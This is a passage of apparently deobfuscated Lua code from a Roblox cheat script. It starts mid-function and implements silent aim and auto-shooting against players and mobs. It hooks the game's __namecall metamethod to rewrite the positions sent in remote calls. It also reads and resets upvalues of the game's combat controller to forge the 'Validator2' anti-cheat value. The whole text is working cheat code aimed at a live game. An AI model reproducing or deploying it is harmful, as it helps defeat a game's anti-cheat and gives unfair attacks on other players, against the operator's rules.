                n = 8
            elseif n == 8 then
                v24, v25 = children(v19, v23)

                if v24 == nil then
                    n = 11
                else
                    n = 9
                end
            elseif n == 9 then
                v23 = v24
                humanoidRootPart3 = v25:FindFirstChild("HumanoidRootPart")
                humanoid = v25:FindFirstChild("Humanoid")

                if v25 ~= character and humanoidRootPart3 and humanoid and humanoid.Health > 0 and (humanoidRootPart3.Position - humanoidRootPart2.Position).Magnitude <= 90 then
                    n = 10
                else
                    n = 8
                end
            elseif n == 10 then
                tool.LeftClickRemote:FireServer((humanoidRootPart3.Position - humanoidRootPart2.Position).Unit, 1)
                n = 11
            elseif n == 11 then
                v14 = v17
                v15 = v21
                v16 = v22
                n = 6
            end
        end
    end)
end

local ok, result = pcall(function()
    local Players = game:GetService("Players")
    local ReplicatedStorage3 = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local localPlayer2 = Players.LocalPlayer
    local modules = ReplicatedStorage3:WaitForChild("Modules", 10)
    local net = modules and modules:WaitForChild("Net", 10)
    local reShootGunEvent = net and net:FindFirstChild("RE/ShootGunEvent")
    local remotes = ReplicatedStorage3:FindFirstChild("Remotes")
    local validator2 = remotes and ReplicatedStorage3.Remotes:FindFirstChild("Validator2")
    local enemies = Workspace:FindFirstChild("Enemies")
    local seaBeasts = Workspace:FindFirstChild("SeaBeasts")
    local characters = Workspace:FindFirstChild("Characters")
    local v11 = getgenv

    local fn13 = v11 or function()
        return _G
    end

    getgenv = fn13
    getgenv()
    local v12 = getupvalue
    local getupvalue_ = v12

    if not v12 then
        local v13 = debug
        getupvalue_ = v13 and debug.getupvalue
    end

    local v13 = setupvalue
    local setupvalue_ = v13

    if not v13 then
        local v14 = debug
        setupvalue_ = v14 and debug.setupvalue
    end

    local v14 = getrawmetatable
    local v15 = setreadonly
    local v16 = newcclosure
    local v17 = checkcaller
    local v18 = getnamecallmethod
    local v19 = typeof
    local v20 = unpack
    local position = nil
    local v21 = nil
    local v22 = nil
    local v23 = nil

    pcall(function()
        local CombatController = require(ReplicatedStorage3.Controllers.CombatController)

        if CombatController and CombatController.Attack and getupvalue_ then
            v23 = getupvalue_(CombatController.Attack, 9)
        end
    end)

    local tbl7 = {
        Settings = {Enabled = _G.Shoot},
        Distance = 100,
        attackMobs = true,
        attackPlayers = true,
        ShootsPerTarget = {["Dual Flintlock"] = 2},
        SpecialShoots = {
            ["Skull Guitar"] = "TAP",
            Bazooka = "Position",
            Cannon = "Position",
            Dragonstorm = "Overheat",
        },
        Overheat = {
            Dragonstorm = {
                MaxOverheat = 3,
                Cooldown = 0,
                TotalOverheat = 0,
                Distance = 500,
                Shooting = false,
            },
        },
    }

    local function fn14(arg, ...)
        local ok, result = pcall(arg, ...)
        if not ok then
            return
        end
        return result
    end

    local function fn15(arg)
        local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
        local flag = humanoid and humanoid.Health > 0
        return flag
    end

    local function fn16(arg)
        if not arg then
            return false
        end
        local enemies2 = Workspace:FindFirstChild("Enemies")
        local characters2 = Workspace:FindFirstChild("Characters")
        local flag = enemies2 and arg.Parent == enemies2
        local flag2 = characters2 and arg.Parent == characters2
        if flag and _G.Aimmon then
            return true
        end

        if not flag2 or not _G.Aimplr then
            return false
        end
        local playerFromCharacter = Players:GetPlayerFromCharacter(arg)

        if playerFromCharacter then
            local team = Players.LocalPlayer.Team
            local team2 = playerFromCharacter.Team
            if team and team2 and team.Name == "Marines" and team2.Name == "Marines" then
                return false
            end
        end

        return true
    end

    local function fn17()
        local character = localPlayer2.Character
        if not character then
            return nil, nil
        end
        local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return nil, nil
        end
        local position2 = humanoidRootPart2.Position
        local v24 = nil
        local v25 = nil
        local huge = math.huge
        local tbl8 = {}

        if _G.Aimmon then
            local enemies2 = Workspace:FindFirstChild("Enemies")

            if enemies2 then
                table.insert(tbl8, enemies2)
            end
        end

        if _G.Aimplr then
            local characters2 = Workspace:FindFirstChild("Characters")

            if characters2 then
                table.insert(tbl8, characters2)
            end
        end

        local v26, v27, v28 = ipairs(tbl8)
        local v29 = v28
        local v30 = v26
        local v31 = v27

        while true do
            local v32, v33 = v30(v31, v29)
            if v32 == nil then
                break
            end

            for i, child in ipairs(v33:GetChildren()) do
                fn14(function()
                    if child:IsA("Model") and child ~= character and fn15(child) then
                        if v33 == characters then
                            local playerFromCharacter = Players:GetPlayerFromCharacter(child)

                            if playerFromCharacter then
                                local team = Players.LocalPlayer.Team
                                local team2 = playerFromCharacter.Team
                                if team and team2 and team.Name == "Marines" and team2.Name == "Marines" then
                                    return
                                end
                            end
                        end

                        local humanoidRootPart3 = child:FindFirstChild("HumanoidRootPart")
                        local head = humanoidRootPart3 or child:FindFirstChild("Head")

                        if head then
                            local magnitude = (position2 - head.Position).Magnitude

                            if magnitude < huge then
                                huge = magnitude
                                v24 = head
                                v25 = child
                            end
                        end
                    end
                end)
            end

            v29 = v32
        end

        return v24, v25
    end

    pcall(function()
        local v24 = v14(game)
        local namecall = v24.__namecall
        v15(v24, false)

        v24.__namecall = v16(function(arg, ...)
            local v25 = v18()
            local tbl8 = {...}
            if v17() or not position or v25 ~= "FireServer" and v25 ~= "InvokeServer" then
                return namecall(arg, ...)
            end

            for i = 1, #tbl8 do
                local v26 = tbl8[i]

                if v19(v26) == "Vector3" then
                    tbl8[i] = position
                elseif v19(v26) == "CFrame" then
                    tbl8[i] = CFrame.lookAt(v26.Position, position)
                end
            end

            return namecall(arg, v20(tbl8))
        end)

        v15(v24, true)
    end)

    RunService.Heartbeat:Connect(function()
        fn14(function()
            local v24, v25 = fn17()

            if v24 and fn16(v25) then
                v21 = v24
                position = v24.Position
                v22 = v25
            else
                v21 = nil
                position = nil
                v22 = nil
            end
        end)
    end)

    local function fn18(arg)
        fn14(function()
            local humanoid = arg:WaitForChild("Humanoid")
            local humanoidRootPart2 = arg:WaitForChild("HumanoidRootPart")

            humanoid.AnimationPlayed:Connect(function(arg2)
                fn14(function()
                    local name = arg2.Name

                    if arg2.Animation.AnimationId == "rbxassetid://10275674268" or name == "GodhumanZ" or name == "SuperhumanV2Z" then
                        local now = tick()
                        local connection = nil

                        connection = RunService.Heartbeat:Connect(function()
                            fn14(function()
                                if arg2.IsPlaying and tick() - now <= 0.7 then
                                    if v21 and fn16(v22) then
                                        humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position, v21.Position)
                                        humanoidRootPart2.CFrame = humanoidRootPart2.CFrame + humanoidRootPart2.CFrame.LookVector * 5
                                    end

                                    return
                                end

                                connection:Disconnect()
                            end)
                        end)
                    end
                end)
            end)
        end)
    end

    if localPlayer2.Character then
        fn18(localPlayer2.Character)
    end

    localPlayer2.CharacterAdded:Connect(function(character)
        fn14(fn18, character)
    end)

    tbl7.ShootsFunctions = {
        ["Skull Guitar"] = function(arg, arg2, arg3)
            fn14(function()
                if arg2 and arg2:FindFirstChild("RemoteEvent") then
                    arg2.RemoteEvent:FireServer("TAP", arg3)
                end
            end)
        end,
    }

    local position2 = nil

    local function fn19(arg)
        local ok, result = pcall(function()
            if arg then
                local humanoid = arg:FindFirstChild("Humanoid")
                if humanoid then
                    local flag = humanoid.Health > 0
                    return flag
                end
            end

            return false
        end)

        local v24 = ok and result
        return v24
    end

    local function fn20(arg)
        local ok, result = pcall(function()
            if not arg then
                return false
            end

            if tostring(arg.Team) == "Marines" and arg.Team == localPlayer2.Team then
                return false
            end

            if not arg:HasTag(string.format("Ally%*", localPlayer2.Name)) and not localPlayer2:HasTag(string.format("Ally%*", arg.Name)) then
                return true
            end
            return false
        end)

        local v24 = ok and result
        return v24
    end

    local function fn21(arg, arg2, arg3)
        local character = localPlayer2.Character
        if not arg or not character or not position2 then
            return
        end
        local tbl8 = {}

        fn14(function()
            tbl8 = arg:GetChildren()
        end)

        for i = 1, #tbl8 do
            fn14(function()
                local v24 = tbl8[i]
                if not v24 then
                    return
                end

                if v24 == character then
                    return
                end

                if v24:GetAttribute("IsBoat") then
                    return
                end

                if not fn19(v24) then
                    return
                end
                local primaryPart = v24.PrimaryPart
                local playerFromCharacter = Players:GetPlayerFromCharacter(v24)

                if primaryPart and (v24.Parent ~= characters or playerFromCharacter and fn20(playerFromCharacter)) and (position2 - primaryPart.Position).Magnitude <= arg2 then
                    table.insert(arg3, {v24, primaryPart})
                end
            end)
        end
    end

    local function fn22(arg, arg2)
        if seaBeasts then
            for i, child in ipairs(seaBeasts:GetChildren()) do
                fn14(function()
                    local meshPart = child:FindFirstChildOfClass("MeshPart")

                    if fn19(child) and meshPart and (position2 - meshPart.Position).Magnitude < arg then
                        table.insert(arg2, {child, meshPart})
                    end
                end)
            end
        end

        if enemies then
            for i, child in ipairs(enemies:GetChildren()) do
                fn14(function()
                    if not child:GetAttribute("IsBoat") then
                        return
                    end
                    local meshPart = child:FindFirstChildOfClass("MeshPart")

                    if fn19(child) and meshPart and (position2 - meshPart.Position).Magnitude < arg then
                        table.insert(arg2, {child, meshPart})
                    end
                end)
            end
        end
    end

    tbl7.UpdateBladeHits = function(arg, arg2, arg3, arg4)
        local tbl8 = {}
        local distance = arg2 or arg.Distance
        local v24 = distance

        if arg3 or arg.attackMobs then
            fn21(enemies, v24, tbl8)
        end

        if arg3 or arg.attackPlayers then
            fn21(characters, v24, tbl8)
        end

        if arg4 then
            fn22(v24, tbl8)
        end

        return tbl8
    end

    local function fn23(arg)
        local v24 = nil
        local v25 = nil

        for i = 1, #arg do
            local v26 = arg[i]

            if v26 and v26[1] and v26[2] and (not v24 or v26[1].Parent == seaBeasts or v26[1]:GetAttribute("IsBoat")) then
                v25 = v26[2]
                v24 = v26[1]
            end
        end

        if v25 and v25.Parent then
            return v25.Position, v25, {v25, math.random()}
        end
        return nil, nil, nil
    end

    tbl7.GetValidator2 = function(arg)
        local ok, result, result2 = pcall(function()
            if not v23 then
                return 0, 0
            end
            local v24 = getupvalue_(v23, 15)
            local v25 = getupvalue_(v23, 13)
            local v26 = getupvalue_(v23, 16)
            local v27 = getupvalue_(v23, 17)
            local v28 = getupvalue_(v23, 14)
            local v29 = getupvalue_(v23, 12)
            local v30 = getupvalue_(v23, 18)
            if not v24 or not v25 or not v26 or not v27 or not v28 or not v29 or not v30 then
                return 0, 0
            end
            local n = ((v28 * v25 + v29 * v24) % v26 * v26 + v29 * v25) % v27
            local n2 = math.floor(n / v26)
            local n3 = v30 + 1
            pcall(setupvalue_, v23, 15, v24)
            pcall(setupvalue_, v23, 13, v25)
            pcall(setupvalue_, v23, 16, v26)
            pcall(setupvalue_, v23, 17, v27)
            pcall(setupvalue_, v23, 14, n2)
            pcall(setupvalue_, v23, 12, n - n2 * v26)
            pcall(setupvalue_, v23, 18, n3)
            return math.floor(n / v27 * 16777215), n3
        end)

        if not ok then
            return 0, 0
        end
        return result, result2
    end

    local function fn24(arg)
        local ok, result = pcall(function()
            if not arg or not arg.Parent then
                return false
            end

            if fn19(arg.Parent) then
                return true
            end

            if arg:FindFirstChild("Health") and arg.Health.Value > 0 then
                return true
            end
            return false
        end)

        local v24 = ok and result
        return v24
    end

    local function fn25(arg)
        fn14(function()
            local setAttribute = arg.SetAttribute
            local attribute = arg:GetAttribute("LocalTotalShots")
            local n = attribute or 0
            setAttribute(arg, "LocalTotalShots", n + 1)
        end)
    end

    tbl7.HandleOverheat = function(arg, arg2, arg3)
        if not arg3 or arg3.Shooting then
            return
        end
        local v24 = arg:UpdateBladeHits(arg3.Distance, false, true)
        if #v24 == 0 then
            return
        end
        local v25, v26 = fn23(v24)
        if not fn24(v26) then
            return
        end
        arg3.Shooting = true

        while arg2 and arg2.Parent == localPlayer2.Character and arg3.TotalOverheat < arg3.MaxOverheat and fn24(v26) do
            fn25(arg2)

            fn14(function()
                validator2:FireServer(arg:GetValidator2())
            end)

            fn14(function()
                reShootGunEvent:FireServer(v26.Position, {v26})
            end)

            arg3.TotalOverheat = arg3.TotalOverheat + task.wait(arg3.Cooldown)
        end

        while arg3.TotalOverheat > 0 do
            arg3.TotalOverheat = math.clamp(arg3.TotalOverheat - task.wait(), 0, arg3.MaxOverheat)
        end

        arg3.Shooting = false
    end

    tbl7.HandleNormal = function(arg, arg2)
        local v24 = arg:UpdateBladeHits(100, false, true)
        if #v24 == 0 then
            return
        end
        local v25, v26, v27 = fn23(v24)
        if not v25 or not v26 or not v27 then
            return
        end
        fn25(arg2)

        fn14(function()
            validator2:FireServer(arg:GetValidator2())
        end)

        local v28 = arg.ShootsPerTarget[arg2.Name]
        local n = v28 or 1

        for i = 1, n do
            fn14(function()
                reShootGunEvent:FireServer(v25, v27)
            end)
        end
    end

    tbl7.HandlePositionOrTap = function(arg, arg2)
        local v24 = arg:UpdateBladeHits(100, false, true)
        if #v24 == 0 then
            return
        end
        local v25, v26 = fn23(v24)
        if not fn24(v26) then
            return
        end

        if arg.ShootsFunctions[arg2.Name] then
            return fn14(arg.ShootsFunctions[arg2.Name], arg, arg2, v26.Position)
        end
        fn25(arg2)

        fn14(function()
            validator2:FireServer(arg:GetValidator2())
        end)

        if arg.SpecialShoots[arg2.Name] == "TAP" then
            fn14(function()
                if arg2:FindFirstChild("RemoteEvent") then
                    arg2.RemoteEvent:FireServer("TAP", v26.Position)
                end
            end)
        else
            fn14(function()
                reShootGunEvent:FireServer(v26.Position)
            end)
        end
    end

    tbl7.UseGunShoot = function(arg, arg2, arg3)
        if not arg3 or not arg3.Enabled then
            return
        end
        local v24 = arg.SpecialShoots[arg3.Name]
        local str2 = v24 or "Normal"
        if str2 == "Overheat" then
            return arg:HandleOverheat(arg3, arg.Overheat[arg3.Name])
        end

        if str2 == "Normal" then
            return arg:HandleNormal(arg3)
        end

        if str2 ~= "Position" and (str2 ~= "TAP" or not arg3:FindFirstChild("RemoteEvent")) then
            return
        end
        return arg:HandlePositionOrTap(arg3)
    end

    tbl7.Shoot = function()
        return pcall(function()
            if not tbl7.Settings.Enabled then
                return
            end
            local character = localPlayer2.Character
            if not fn19(character) then
                return
            end
            local tool = character:FindFirstChildOfClass("Tool")
            if not tool then
                return
            end

            if tool.ToolTip ~= "Gun" then
                return
            end
            local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart2 then
                return
            end
            position2 = humanoidRootPart2.Position
            tbl7:UseGunShoot(character, tool)
        end)
    end

    RunService.Stepped:Connect(function()
        pcall(function()
            tbl7.Shoot()
        end)
    end)

    return tbl7
end)

if not ok then
    return setmetatable({}, {
        __index = function()
            return function() end
        end,
    })
end

return result
